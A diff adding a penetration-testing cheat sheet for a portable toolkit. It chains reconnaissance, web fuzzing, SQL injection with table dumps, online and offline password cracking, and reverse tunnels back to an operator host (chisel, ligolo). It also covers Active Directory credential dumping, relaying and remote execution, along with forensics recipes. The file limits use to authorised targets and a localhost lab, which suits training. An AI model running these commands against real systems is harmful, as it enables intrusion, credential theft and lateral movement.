@@ -1,0 +1,135 @@
+# arsenal-playbook -- HOW to use the arsenal, not just what it is. read straight
+# (`less ~/tools/arsenal-playbook`) or via the launcher:
+#   sh ~/tools/arsenal chains     the mission workflows, tools wired end-to-end
+#   sh ~/tools/arsenal <tool>     one tool's canonical recipes
+# rides p3 (capability), like arsenal-catalog -- adding a recipe is a line here
+# + a rebuild, never a signed-image change. base CLI (grep/nc/ssh/wg/cryptsetup)
+# is taught by `learn`; this is the arsenal layer that sits on top of it.
+#
+# every command runs through xexec (p3 is noexec): a static binary as
+# `sh ~/tools/xexec <name> ARGS`, a python tool as `sh ~/tools/xexec -t
+# ~/tools/python bin/python3 ~/tools/<tool>/<script> ARGS`. recipes below show
+# the tool + its args; the launcher prints the xexec run-form above them. WL =
+# ~/wordlists, TARGET/HOST = something you are authorised to test.
+#
+# LAB WITHOUT A NETWORK: the arsenal is its own range. serve a target from one
+# abduco window and attack localhost from another --
+#   python -m http.server 8000      -> a web target for ffuf/httpx/nuclei/gobuster
+#   dropbear (the running sshd)      -> an ssh target for hydra
+#   a .pcap / a firmware blob / any binary on the stick -> tcpdump/binwalk/radare2
+# never point offense tools at a host you do not own.
+
+# ==== CHAINS ====   run one of these end-to-end; that is how the kit is learned
+
+:recon   passive discovery -> live probe -> targeted scan
+	subfinder -d TARGET -silent            # names, no packets to TARGET
+	httpx -l hosts -silent -title -tech-detect -sc   # which answer, what they are
+	nmap -sV -sC -p- HOST                  # go deep only on what answered
+	nuclei -l live-urls                    # templated vulns + misconfig
+	lab: python -m http.server 8000 & then httpx -u http://localhost:8000
+
+:web     map the app -> find the hole -> exploit it
+	gobuster dir -u https://TARGET -w WL/common.txt    # hidden paths
+	ffuf -w WL/params.txt -u 'https://TARGET/api?FUZZ=1' -fc 404  # params
+	sqlmap -u 'https://TARGET/item?id=1' --batch --dbs # injection -> data
+	nuclei -u https://TARGET -tags cve,exposure
+
+:crack   get hashes/logins -> break them
+	hydra -L WL/users.txt -P WL/rockyou.txt ssh://TARGET  # online, be quiet
+	john --wordlist=WL/rockyou.txt hashes.txt             # offline, fast
+	john --show hashes.txt                                # read what cracked
+	lab: hydra -l root -P WL/rockyou.txt ssh://localhost  (dropbear)
+
+:pivot   one foothold -> reach the network behind it
+	chisel server -p 8080 --reverse           # on your box (operator)
+	chisel client OPERATOR:8080 R:socks       # on the foothold -> socks proxy
+	ligolo-proxy -selfcert (operator) + ligolo-agent -connect OPERATOR:11601 (target)
+	socat TCP-LISTEN:9000,fork TCP:INTERNAL:445   # or a single port-forward
+
+:ad      windows/active-directory, from a domain foothold (impacket)
+	GetNPUsers.py DOM/ -usersfile users -no-pass    # AS-REP roast (no creds)
+	GetUserSPNs.py DOM/user:pass -request           # kerberoast -> crack in john
+	secretsdump.py DOM/user:pass@HOST               # dump SAM/NTDS hashes
+	ntlmrelayx.py -tf targets.txt -smb2support      # relay captured auth
+	psexec.py DOM/user@HOST   (or wmiexec.py, smbexec.py)  # code exec
+
+:forensics  triage a disk/file: is it alive, what is on it, recover it
+	smartctl -H /dev/sdX                # dying? check BEFORE you trust it
+	ddrescue -r3 /dev/sdX image.img map.log   # image what still reads
+	testdisk image.img                  # rebuild a lost partition table
+	photorec image.img                  # carve files by signature when FS is gone
+
+:reverse  understand an unknown binary/blob offline
+	file blob                           # what is it, before anything else
+	binwalk -Me firmware.bin            # carve embedded FS/keys, recursively
+	r2 -A blob     then: afl ; pdf @main ; iz     # analyse, list fns, strings
+	cc: sh ~/tools/xexec -t ~/tools/cc cc poc.c -o poc   # build a quick PoC
+
+:capture  see the wire
+	tcpdump -i IFACE -w cap.pcap                 # record
+	tcpdump -nn -r cap.pcap 'tcp port 80'        # read back, filtered
+	masscan -p1-65535 10.0.0.0/8 --rate 10000    # find ports fast, then nmap
+
+:read     the offline knowledge on the stick
+	kiwix-serve --port 8080 /run/media/*/XOS-KNOW/zim/*.zim   then: links http://localhost:8080
+	kiwix-search ZIM 'query'            # grep the zims, no server
+	mutool draw -F txt file.pdf | less  # a pdf as text
+	rg -i 'pattern' ~/loot ; jq -r '.[].name' out.json   # sift loot
+
+# ==== TOOLS ====   name<TAB>recipe   (grepped by `arsenal <name>`)
+ffuf	ffuf -w WL/common.txt -u https://TARGET/FUZZ -mc 200,301,302,401
+ffuf	vhost: ffuf -w WL/subdomains.txt -u https://TARGET -H 'Host: FUZZ.target' -fs 0
+ffuf	param: ffuf -w WL/params.txt -u 'https://TARGET/api?FUZZ=1' -fc 404
+httpx	httpx -l hosts.txt -silent -title -tech-detect -status-code -follow-redirects
+httpx	probe ports: httpx -l hosts.txt -ports 80,443,8080,8443 -silent
+nuclei	nuclei -u https://TARGET                       # all templates
+nuclei	nuclei -l live-urls.txt -tags cve,exposure -severity high,critical
+subfinder	subfinder -d TARGET -silent -all               # passive subdomains
+dnsx	dnsx -l hosts.txt -a -resp -silent             # resolve + show records
+dnsx	brute: dnsx -d TARGET -w WL/subdomains.txt -silent
+gobuster	gobuster dir -u https://TARGET -w WL/common.txt -x php,txt,bak
+gobuster	gobuster dns -d TARGET -w WL/subdomains.txt
+gobuster	gobuster vhost -u https://TARGET -w WL/subdomains.txt --append-domain
+masscan	masscan -p1-65535 10.0.0.0/8 --rate 10000 -oL scan.txt   # then nmap the hits
+nmap	nmap -sV -sC -p- TARGET                         # versions + default scripts
+nmap	discover: nmap -sn 10.0.0.0/24                   # who is alive
+nmap	nmap --script vuln -p 80,443 TARGET             # NSE vuln checks
+tcpdump	tcpdump -i IFACE -w cap.pcap                     # capture to file
+tcpdump	tcpdump -nn -r cap.pcap 'host 10.0.0.5 and port 443'
+chisel	server: chisel server -p 8080 --reverse   |   client: chisel client OP:8080 R:socks
+socat	forward: socat TCP-LISTEN:9000,fork,reuseaddr TCP:INTERNAL:445
+socat	tls-wrap: socat OPENSSL-LISTEN:8443,cert=c.pem,verify=0 TCP:127.0.0.1:80
+ligolo-proxy	ligolo-proxy -selfcert          # operator side; in its shell: session, then start
+ligolo-agent	ligolo-agent -connect OPERATOR:11601 -ignore-cert   # dropped on the foothold
+hydra	hydra -L WL/users.txt -P WL/rockyou.txt ssh://TARGET -t 4   # slow = quiet
+hydra	http form: hydra -l admin -P WL/rockyou.txt TARGET http-post-form '/login:u=^USER^&p=^PASS^:invalid'
+john	john --wordlist=WL/rockyou.txt hashes.txt        # detect + crack
+john	john --format=nt --wordlist=WL/rockyou.txt nt.txt ; john --show nt.txt
+sqlmap	sqlmap -u 'https://TARGET/item?id=1' --batch --dbs
+sqlmap	dump: sqlmap -u '...' --batch -D dbname -T users --dump
+impacket	secretsdump.py DOMAIN/user:pass@HOST            # dump hashes (SAM/NTDS)
+impacket	GetUserSPNs.py DOMAIN/user:pass -request        # kerberoast
+impacket	GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass  # AS-REP roast
+impacket	ntlmrelayx.py -tf targets.txt -smb2support      # relay auth
+impacket	exec: psexec.py DOMAIN/user@HOST   (also wmiexec.py / smbexec.py / dcomexec.py)
+pspy	pspy                                             # watch procs/cron, no root
+ddrescue	ddrescue -r3 /dev/sdX image.img map.log          # resumes via the map
+testdisk	testdisk image.img          # interactive: rebuild partition table/boot
+photorec	photorec image.img          # interactive: carve files by signature
+smartctl	smartctl -H /dev/sdX ; smartctl -a /dev/sdX ; smartctl -t short /dev/sdX
+file	file blob ; file -k blob        # -k = keep going, show every match
+binwalk	binwalk firmware.bin ; binwalk -Me firmware.bin   # -Me = extract, recursive
+strace	strace -f -e trace=network CMD ; strace -p PID     # follow forks / attach
+radare2	r2 -A blob   then: afl (list fns) ; pdf @main ; iz (strings) ; V (visual)
+radare2	rabin2 -I blob (headers/arch) ; rax2 0x41 (base convert)
+cc	sh ~/tools/xexec -t ~/tools/cc cc file.c -o out   # static, own cpp/as/ld
+links	links http://localhost:8080 ; links file.html    # text browser
+mutool	mutool draw -F txt file.pdf | less                # pdf -> text
+frotz	frotz game.z5                                     # play interactive fiction
+whois	whois TARGET.com ; whois 1.2.3.4                  # registration data
+jq	jq '.key' out.json ; jq -r '.[].name' out.json    # -r = raw, unquoted
+rg	rg -i 'pattern' ~/loot ; rg -l 'TODO' . ; rg -A3 'error' log
+zstd	zstd -d file.zst ; zstd -19 file ; zstd -dc x.zst | tar xf -
+kiwix-serve	kiwix-serve --port 8080 ZIM.zim   then: links http://localhost:8080
+kiwix-search	kiwix-search ZIM.zim 'query'                     # no server needed
+python	sh ~/tools/xexec -t ~/tools/python bin/python3        # repl / -m http.server 8000
